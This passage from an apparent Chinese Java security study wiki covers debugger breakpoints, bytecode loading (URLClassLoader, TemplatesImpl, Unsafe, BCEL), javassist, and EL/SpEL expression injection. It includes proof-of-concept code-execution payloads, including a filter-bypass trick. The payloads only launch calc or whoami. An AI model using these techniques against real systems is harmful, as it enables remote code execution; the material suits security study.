All：阻塞该程序内所有线程（默认） Thread：只阻塞当前断点所在线程（在多线程调试、远程调试中强烈建议使用这种方式） Condition：这就是所谓的条件断点，只有书写的表达式返回true时候断点才会被激活 Log： 勾选\"Breakpoint hit message\"：断点激活时输出提示日志 勾选\"Stack trace\"：断点激活时输出程序调用栈信息 勾选\"Evaluate and log\"：并在下面的输入框中输入\"args\"，断点激活时会计算并输出变量 args 的值 可以同时选中 Temporary line breakpoint（临时行断点） 创建方法不说了，同上。和上面的唯一区别是：把Remove once hit这个复选框给勾选上（此类型断点其实使用较少）。 Field watchpoint（属性断点） 创建的方式和上无差异。（目前发现是针对的类中定义的变量） 断点参数 由于绝大多数参数第一个已经讲述了，so这里只剩一个它独有的参数： Watch：选中\"Filed Access\" 读取的时候都会断住。选中\"Filed madification\"表示修改的时候都会断住 Method breakpoint（方法断点） 打断点方式同上，只是它是必须把断点打在方法那一行上。 它也有一个自己独有的参数： Watch： - “Method entry”：进入方法时激活断点 - “Method exit”：出去方法时激活断点 - “Emulated”：目前发现没啥卵用（求小伙伴不要喷我~） Exception breakpoint（异常断点） 异常断点属于非常特殊的一种断点类型，它不对应任何一行代码，因为它属于程序级别的断点。 它不能像上面在代码处直接创建，只能通过上面的断点对话框来创建。 此处注意：异常断点中很多选项就是不能使用的（灰色）如下图示： 断点参数 但是同理，它也提供一个特有的断点参数： Notification： - “Catch excetion”：程序在捕获（Try Catch）这个异常时激活断点 - “Uncatch excetion”：不catch捕获异常时激活断点 小细节：对于不同类型的断点，打桩后我们看到的图标也是有差异的，如图： 条件断点 就是断点在满足条件的时候才会阻塞，不过一般也只能书写一些较简单的判定 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/07.Java加载字节码.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/07.Java加载字节码.html","title":"07.Java加载字节码","keywords":"","body":" 简介 什么是Java字节码 JAVA程序的运行 字节码如何产生 如何看懂字节码 加载字节码 利用URLClassLoader加载远程class文件 利用ClassLoader#defineClass加载字节码 利用TemplatesImpl加载字节码 利用Unsafe#defineClass加载字节码 利用BCEL ClassLoader加载字节码 参考 简介 什么是Java字节码 它是程序的一种低级表示，可以运行于Java虚拟机上。将程序抽象成字节码可以保证Java程序在各种设备上的运行 Java号称是一门“一次编译到处运行”的语言，从我们写的java文件到通过编译器编译成java字节码文件（.class文件），这个过程是java编译过程；而我们的java虚拟机执行的就是字节码文件。不论该字节码文件来自何方，由哪种编译器编译，甚至是手写字节码文件，只要符合java虚拟机的规范，那么它就能够执行该字节码文件。 JAVA程序的运行 因为Java具有跨平台特性，为了实现这个特性，Java执行在一台虚拟机上，这台虚拟机就是JVM，Java通过JVM屏蔽了不同平台之间的差异，从而做到一次编译到处执行。 JVM位于Java编译器和OS平台之间，Java编译器只需面向JVM，生成JVM能理解的代码，这个代码即字节码，JVM再将字节码翻译成真实机器所能理解的二进制机器码。 字节码如何产生 我们编写的代码文件通常是以.java作为结尾的，可以直接通过javac命令将java文件编译为.class文件，这个.class文件就是字节码文件，也可以直接运行IDE，让其自动为我们编译 如何看懂字节码 可以参考文章：深入理解JVM-读懂java字节码 加载字节码 通常我们是编写好java代码然后ide帮我们自动编译成class字节码文件再加载到jvm中运行的，那如果我们想自己加载class文件，有哪些办法呢？ 后续利用到的演示恶意代码如下 import java.io.IOException; public class Exp { public Exp() throws IOException { Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); } } 编译为字节码 javac Exp.java 利用URLClassLoader加载远程class文件 利用ClassLoader来加载字节码文件是最基础的方法，URLClassLoader继承自ClassLoader且重写了findClass函数，允许远程加载字节码，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用（当然，该方式只适应于目标出网的情况）。 正常情况下，Java会根据配置项 sun.boot.class.path和java.class.path中列举到的基础路径（这些路径是经过处理后的java.net.URL类）来寻找.class文件来加载，而这个基础路径有分为三种情况： URL未以斜杠/结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件（jar文件中直接包含class文件，可以使用命令 jar cvf Exp.jar Exp.class 进行打包）。 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:8000/Exp.jar\")}); // 会加载 http://127.0.0.1:8000/Exp.jar中的Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // 触发构造函数，弹计算器 exp.newInstance(); } } URL以斜杠/结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件。 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"file:/Users/d4m1ts/d4m1ts/java/classloader/\")}); // 会加载 /Users/d4m1ts/d4m1ts/java/classloader/Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // 触发构造函数，弹计算器 exp.newInstance(); } } URL以斜杠/结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类.class文件。 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:8000/\")}); // 会加载 http://127.0.0.1:8000/Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // 触发构造函数，弹计算器 exp.newInstance(); } } 主要关注第三点，利用基础的Loader类来寻找类，而要利用这一点必须是非file协议的情况下 除file协议外，JAVA默认提供了对ftp,gopher,http,https,jar,mailto,netdoc协议的支持 因此作为攻击者，只要我们能够控制目标Java URLClassLoader的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。 利用ClassLoader#defineClass加载字节码 其实java不管是加载远程的class文件，还是本地的class或者jar文件，都是要经历下面三个方法调用的： loadClass: 从已加载的类缓存、父加载器等位置寻找类（双亲委派机制），在前面没有找到的情况下，执行 findClass。 findClass: 根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass。 defineClass: 处理前面传入的字节码，将其处理成真正的Java类。 着重关注第三个方法defindClass，由于ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法。 由于ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法 import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class loadClassFile { public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp.class\")); // 通过反射调用 defineClass Class clazz = ClassLoader.class; Method defineClass = clazz.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); Class exp = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Exp\", classBytes, 0, classBytes.length); // 需要手动实例化触发构造函数 exp.newInstance(); } } 需要注意的是，ClassLoader#defineClass返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以我们需要想办法调用返回的类的构造函数才能执行命令。 在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 TemplatesImpl 的基石。 利用TemplatesImpl加载字节码 在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影。虽然大部分上层开发者不会直接使用到defineClass方法，同时java.lang.ClassLoader的defineClass方法作用域是不开放的（protected），很难利用，但是Java底层还是有一些类用到了它，譬如TemplatesImpl 在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中定义了一个内部类：TransletClassLoader 可以看到这个类继承了ClassLoader，而且重写了defineClass方法，并且没有显式地定义方法的作用域。 Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。也就是说这里的defineClass由其父类的protected类型变成了一个default类型的方法，可以被同一个包下的类调用。 由于TransletClassLoader是default的可以被同一个包下的类调用，所以由下向上寻找这个defineClass()在TemplatesImpl中的调用链 一直Find Usages，最终找到调用链如下： TemplatesImpl#getOutputProperties() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass(final byte[] b) 最外层的2个方法均是public修饰的，可以被外部调用，以TemplatesImpl#getOutputProperties()为例。 初次观察整个链，需要设置的参数如下_bytecodes（字节码，不能为null）、_name（不能为null）、_class（需要为null，而默认情况下也为null，所以可以不需要） 但是这样会抛出异常NullPointerException，经过分析，发现还需要设置_tfactory参数，它的类型为TransformerFactoryImpl 所以一共需要设置3个参数，分别是_bytecodes、_name、_tfactory 通过下方实例化的代码，可以看出远程加载的类还必须继承AbstractTranslet类 所以我们的恶意类代码修改如下： import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Exp2 extends AbstractTranslet { public Exp2() throws IOException { Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 加载字节码代码 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.TransformerConfigurationException; import java.io.IOException; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class loadClassFile { public static void main(String[] args) throws IOException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp2.class\")); TemplatesImpl templates = new TemplatesImpl(); Class clazz = templates.getClass(); Field bytecodes = clazz.getDeclaredField(\"_bytecodes\"); Field name = clazz.getDeclaredField(\"_name\"); Field _tfactory = clazz.getDeclaredField(\"_tfactory\"); bytecodes.setAccessible(true); name.setAccessible(true); _tfactory.setAccessible(true); bytecodes.set(templates, new byte[][]{classBytes}); name.set(templates, \"d4m1ts\"); _tfactory.set(templates, new TransformerFactoryImpl()); templates.newTransformer(); } } 利用Unsafe#defineClass加载字节码 Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。使用该类可以获取到底层的控制权，该类在sun.misc包，默认是BootstrapClassLoader加载的。 而它里面也存在一个defineClass方法，且为public可直接调用 但因为Unsafe的构造方法是private类型的，所以无法通过new方式实例化获取，只能通过它的getUnsafe()方法获取。 又因为Unsafe是直接操作内存的，为了安全起见，Java的开发人员为Unsafe的获取设置了限制，所以想要获取它只能通过Java的反射机制来获取。 因为安全问题，不能直接调用 但前面也说了，我们可以通过反射的方式来调用 通过分析发现，theUnsafe为Unsafe的对象，我们反射拿到这个对象，就可以执行任意方法了 加载字节码代码 import sun.misc.Unsafe; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; import java.security.ProtectionDomain; public class loadClassFile { public static void main(String[] args) throws IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp.class\")); Class unsafeClass = Unsafe.class; Field theUnsafe = unsafeClass.getDeclaredField(\"theUnsafe\"); theUnsafe.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafe.get(null); Class exp = unsafe.defineClass(\"Exp\", classBytes, 0, classBytes.length, ClassLoader.getSystemClassLoader(), null); exp.newInstance(); } } 利用BCEL ClassLoader加载字节码 BCEL（Byte Code Engineering Library）的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目。它提供了一系列用于分析、创建、修改Java Class文件的API。但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中，位于com.sun.org.apache.bcel 虽然说它包含在原生库吧，但是在jdk8u251后，com.sun.org.apache.bcel.internal.util.ClassLoader就被删除了，如果单独引入了它的依赖，则还有ClassLoader，参考 BCEL ClassLoader去哪了 依赖： org.apache.bcel bcel 5.2 在bcel的包中有一个ClassLoader，他重写了Java内置的ClassLoader#loadClass()方法，在loadclass方法中会对类名进行判断，如果类名以$$BCEL$$开始，就会进入createClass方法， 然后在createClass方法里面，会调用Utility.decode()来解密，最后生成clazz 但如何生成能给它解密的字节码呢？ 通过BCEL提供的两个类Repository和Utility来实现： Repository：用于将一个Class先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； Utility：用于将原生的字节码转换成BCEL格式的字节码； 利用代码 JavaClass javaClass = Repository.lookupClass(Exp.class); String encode = Utility.encode(javaClass.getBytes(), true); System.out.println(encode); new org.apache.bcel.util.ClassLoader().loadClass(\"$$BCEL$$\" + encode).newInstance(); 结果 看着很简单很容易，但是有很多坑 坑点一： jdk8u261，Utility.encode中，GZIPOutputStream流不会close，所以内容写不进ByteArrayOutputStream的（给俺整懵了，网上没找到一个说这个问题的，还是得自己调试才行，离谱） 换了个低版本的jdk8u231，就关闭了流可以写入进行加密，俺也不懂为啥高版本删除了，难道是删除ClassLoader的时候一起删除了？。。。 坑点二： 换了低版本的JDK，但是出现了新的问题，提示不支持的操作 跟了一下，发现在ClassLoader#createClass()方法中有问题 其中在调用setBytes()是提示这个方法调用会失败 跟进一下，发现会直接抛出异常。。。 找了一大圈，没发现有人提到这个问题，后来不经意看到了setBytes的说明，在BCEL 6.0的时候遗弃了。。。 所以需要用低于6.0版本的BCEL，换了个06年的5.2 org.apache.bcel bcel 5.2 方法没被遗弃，然后解决了这个问题 参考 Java安全-Java动态加载字节码方法 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/08.javassist字节码编程.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/08.javassist字节码编程.html","title":"08.javassist字节码编程","keywords":"","body":" 介绍 使用 常用类 依赖 举例 参考 介绍 javassist是一个开源的分析、编辑和创建Java字节码的类库，通过javassist提供的API可以在java程序运行时编辑一个类的字节码信息，改变该类的结构信息。说简单点，就是一个用来处理Java字节码的类库。 除了Javassist，常见的字节码编程工具有ASM和byte-buddy，这两个工具相对来说更加偏向于底层，需要了解关于jvm的指令；使用javassist可以不需要了解jvm指令，只需使用javassist类库提供的API接口就可以实现字节码编程。 使用 常用类 javassist字节码编程常用的类： ClassPool：ClassPool 类可以控制的类的字节码，例如创建一个类或加载一个类，与JVM类装载器类似；它是基于哈希表（Hashtable）实现的CtClass对象容器，其中键名是类名称，值是表示该类的CtClass对象（Hashtable和Hashmap类似都是实现map接口，hashmap可以接收null的值，但是Hashtable不行）。 public static synchronized ClassPool getDefault() // 返回默认的类池对象。 public ClassPath insertClassPath(String pathname) // 在搜索路径的开头插入目录或jar（或zip）文件。 public ClassPath insertClassPath(ClassPath cp) // ClassPath在搜索路径的开头插入一个对象。 public ClassLoader getClassLoader() // 获取类加载器toClass()，getAnnotations()在 CtClass等 public CtClass get(String classname) // 从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。 public ClassPath appendClassPath(ClassPath cp) // 将ClassPath对象附加到搜索路径的末尾。 public CtClass makeClass(String classname) // 创建一个新的public类 CtClass： CtClass表示编译时的一个类，它提供了类的操作，如在类中动态添加新字段、方法和构造函数、以及改变类、父类和接口的方法 public void setSuperclass(CtClass clazz) // 更改超类，除非此对象表示接口。 public Class toClass(Lookup lookup) // 将此类转换为java.lang.Class对象。 public byte[] toBytecode() // 将该类转换为字节码数组。 public void writeFile() // 将由此CtClass对象表示的类文件写入当前目录。 public void writeFile(String directoryName) // 将由此CtClass 对象表示的类文件写入本地磁盘。 public CtConstructor makeClassInitializer() // 制作一个空的类初始化程序（静态构造函数）。 CtMethod：表示类中的方法，通过它可以给类创建新的方法，还可以修改返回类型，访问修饰符等，甚至还可以修改方法体内容代码 CtField：类的属性，通过它可以给类创建新的属性，还可以修改已有的属性的类型，访问修饰符等 CtConstructor：用于访问类的构造，与CtMethod类的作用类似 public void setBody(String src) // 设置构造函数主体 public void setBody(CtConstructor src, ClassMap map) // 从另一个构造函数复制一个构造函数主体。 public CtMethod toMethod(String name, CtClass declaring, ClassMap map) // 复制此构造函数并将其转换为方法 ClassClassPath：该类作用是用于通过getResourceAsStream()在java.lang.Class中获取类文件的搜索路径。 public ClassClassPath(Class c) // 构造函数，创建一个搜索路径 public URL find(String classname) // 获取指定类文件的URL public InputStream openClassfile(String classname) // 通过getResourceAsStream()获取类 依赖 org.javassist javassist 3.28.0-GA 举例 创建对象Test，并创建public static void main( String[] )方法，最后反射调用 import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class Main { public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { //创建classPool类池对象 ClassPool classPool = ClassPool.getDefault(); // 通过classPool创建一个新的类Test CtClass test = classPool.makeClass(\"Test\"); // 创建 void main() 方法，（方法的返回值类型你，方法名，方法的参数类型，方法所属的类） CtMethod mainMethod = new CtMethod(CtClass.voidType, \"main\", new CtClass[]{classPool.get(String[].class.getName())}, test); // 设置main方法的访问修饰符 public static mainMethod.setModifiers(Modifier.PUBLIC + Modifier.STATIC); // 设置方法内容 mainMethod.setBody(\"System.out.println(\\\"test\\\");\"); // 添加方法 test.addMethod(mainMethod); // 写入当前目录，运行后会在当前项目的根目录生成 Test.class 文件 test.writeFile(); // 讲test转换为字节码数组输出 System.out.println(Arrays.toString(test.toBytecode())); // 生成Class对象，反射调用main方法 Class aClass = test.toClass(); Object o = aClass.newInstance(); aClass.getDeclaredMethod(\"main\", String[].class).invoke(o, new String[1]); } } 创建构造函数，和刚才的差不多，微改即可 import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; public class Main { public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { //创建classPool类池对象 ClassPool classPool = ClassPool.getDefault(); // 通过classPool创建一个新的类Test CtClass test = classPool.makeClass(\"Test\"); // 创建构造函数 CtConstructor constructor = new CtConstructor(null, test); // 设置main方法的访问修饰符 public constructor.setModifiers(Modifier.PUBLIC); // 设置方法内容 constructor.setBody(\"System.out.println(\\\"test\\\");\"); // 添加方法 test.addConstructor(constructor); // 写入当前目录，运行后会在当前项目的根目录生成 Test.class 文件 test.writeFile(); // 生成Class对象，然后生成实例 Class aClass = test.toClass(); Object o = aClass.newInstance(); } } 参考 10-java安全基础——javassist字节码编程 Java安全之Javassist动态编程 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/09.EL表达式.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/09.EL表达式.html","title":"09.EL表达式","keywords":"","body":" 介绍 快速搭建tomcat环境 前期准备 环境搭建 EL表达式使用 EL基础语法 [ ]与.运算符 获取变量举例 操作符 隐含对象 函数 禁用/启用EL表达式 EL表达式注入 EL表达式注入绕过 参考 介绍 EL 全名为Expression Language，是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。 EL主要作用： 获取数据 EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的web域 中检索java对象、获取数据。(某个web域 中的对象，访问javabean的属性、访问list集合、访问map集合、访问数组) 执行运算 利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算。${user==null} 获取web开发常用对象 EL 表达式定义了一些隐式对象，利用这些隐式对象，web开发人员可以很轻松获得对web常用对象的引用，从而获得这些对象中的数据。 调用Java方法 EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法。 快速搭建tomcat环境 因为需要使用到JSP来学习EL表达式，所以想法是快速搭一个tomcat环境，之前采用的是添加tomcat依赖到pom.xml的方法，使用内置tomcat，但是感觉搭建环境速度太慢了，所以学了个新的方法来快速搭建tomcat环境 参考：https://blog.51cto.com/u_15119353/3309943 前期准备 tomcat可用版 IDEA tomcat各版本下载地址：https://archive.apache.org/dist/tomcat/tomcat-8/ 环境搭建 先建一个平平无奇的Java项目 然后右键，选择Add Framework Support... 勾选Web Application 这个时候就会多一个web目录，也就是我们的webapps目录 打开Project Structure窗口，新建2个文件夹在WEB-INF目录下，分别是classes和lib，这一步是为了添加项目类路径 修改编译后的类路径到我们刚才新建的classes目录下 添加本地tomcat服务器 配置好需要的信息，然后Fix修复一下 给应用上下文路径设置为跟路径，如果这里设置为/a 则访问就变成 localhost:8080/a/ 然后启动运行即可 项目结构 EL表达式使用 EL基础语法 在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。 例如，${userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${pageScope.userinfo}表示访问page范围中的userinfo变量。 简单地说，使用EL表达式语法：${EL表达式} 其中，EL表达式和JSP代码等价转换。事实上，可以将EL表达式理解为一种简化的JSP代码。 扩展JSP代码的写法总结： JSP表达式： 向浏览器输出变量或表达式的计算结果。 JSP脚本： 执行java代码的原理：翻译到_jspService()方法中。 JSP声明： 声明jsp的成员变量或成员方法。 JSP注释： 用于注释JSP代码，不会翻译到Java文件中，也不会执行。 [ ]与.运算符 EL表达式提供.和[]两种运算符来存取数据。 当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[\"My-Name\"]}。 如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。 获取变量举例 map = new HashMap<>(); map.put(\"my-name\", \"admin\"); request.setAttribute(\"test\", map); %> 从四个作用域中搜索变量：${name} 从requestScope作用域中获取变量：${requestScope.request} 从sessionScope作用域中获取变量：${sessionScope.session} 从pageScope作用域中获取变量：${pageScope.page} 从applicationScope作用域中获取变量：${applicationScope.application} 从作用域中获取特殊符号变量：${requestScope.test[\"my-name\"]} 操作符 类型 符号 算术型 +、-（二元）、*、/、div、%、mod、-（一元） 逻辑型 and、&&、or、\\ \\ 、!、not 关系型 ==、eq、!=、ne、、gt、=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 空 empty 空操作符是前缀操作，可用于确定值是否为空。 条件型 A ?B :C 。根据 A 赋值的结果来赋值 B 或 C。 运算符优先级如下（从高到低，从左到右）： [] . () (用于更改运算符的优先) - (一元) not ! empty * / div % mod + - (二元) += <> = lt gt le ge == != eq ne && and || or ? : -> = ; 隐含对象 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描 述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 函数 EL表达式语法允许开发人员开发自定义函数，以调用Java类的方法。语法：${prefix：method(params)} 在EL表达式中调用的只能是Java类的静态方法，这个Java类的静态方法需要在TLD文件中描述，才可以被EL表达式调用。 EL自定义函数用于扩展EL表达式的功能，可以让EL表达式完成普通Java程序代码所能完成的功能。 举例： ==>编写一个让所有字符大写的函数 一般来说， EL自定义函数开发与应用包括以下三个步骤： 1、编写一个Java类的静态方法 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 3、在JSP页面中导入和使用自定义函数 1、编写一个Java类的静态方法，代码如下 public class ELFunc { public static String up(String message) { if (message == null){ return null; } return message.toUpperCase(); } } 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 ELFunc.tld位置 代码 1.0 ELFunc --> /ELFunc 子元素用于指定EL自定义函数的名称--> up 子元素用于指定完整的Java类名--> ELFunc 子元素用于指定Java类中的静态方法的签名， 20 方法签名必须指明方法的返回值类型及各个参数的类型，各个参数之间用逗号分隔。--> java.lang.String up(java.lang.String) 3、在JSP页面中导入和使用自定义函数 ${fn:up(\"123aaabbbCCC\")} 实验了好久代码应该是没问题的，但是还是有报错，后面需要再解决这个问题吧，今天是解决不了了，不然一天没了。。。 禁用/启用EL表达式 全局禁用EL表达式，web.xml中进入如下配置： *.jsp true 单个文件禁用EL表达式 在JSP文件中可以有如下定义： 该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。 JSP2.0中默认的启用EL表达式。 EL表达式注入 原理都是一样的：表达式全部或部份外部可控。列一些通用的poc //对应于JSP页面中的pageContext对象（注意：取的是pageContext对象） ${pageContext} //获取Web路径 ${pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")} //文件头参数 ${header} //获取webRoot ${applicationScope} //执行命令 ${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())} EL表达式注入绕过 通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤 ${\"xxx\".toString().charAt(0).toChars(97)[0].toString()} ${\"xxx\".toString().charAt(0).toChars(97)[0].toString().concat(\"xxx\".toString().charAt(0).toChars(98)[0].toString())} 通过以上代码，只需要修改toChars()中的ascii码值就可以变成任意字符 参考 javaweb学习总结(二十九)——EL表达式 浅析EL表达式注入漏洞 （很详细） Java EL （Expression Language）表达式注入 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/10.SpEL表达式.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/10.SpEL表达式.html","title":"10.SpEL表达式","keywords":"","body":" 介绍 基础使用 pom.xml 基础例子 SpEL语法 SpEL表达式分类 基本表达式 类相关表达式 集合相关表达式 其他表达式 SpEL类相关表达式‼️ 类类型表达式 类实例化 instanceof 表达式 常用payload 绕过方式 防御 参考 介绍 Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。 SpEL的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。 Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。 基础使用 先新建一个Spring项目 pom.xml org.springframework spring-expression 5.2.12.RELEASE 基础例子 一个简单的Controller message为get传入的参数 ExpressionParser接口负责解析表达式字符串 getValue方法执行表达式并返回结果 默认容器是spring本身的容器：ApplicationContext package com.spel.test.demo; import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class HelloController { @GetMapping(\"/test\") public String catUser(String message) { ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); return expression.getValue().toString(); } } 访问 http://127.0.0.1:8080/test?message=T(java.lang.Math).random()*100，可见成功得到一个随机数，说明表达式被执行了 访问 http://127.0.0.1:8080/test?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() 可以直接执行系统命令 SpEL语法 SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如： 引用其他对象:#{car} 引用其他对象的属性：#{car.brand} 调用其它方法 , 还可以链式操作：#{car.toString()} 其中属性名称引用还可以用$符号 如：${someProperty} 除此以外在SpEL中，使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符： #{T(java.lang.Math)} 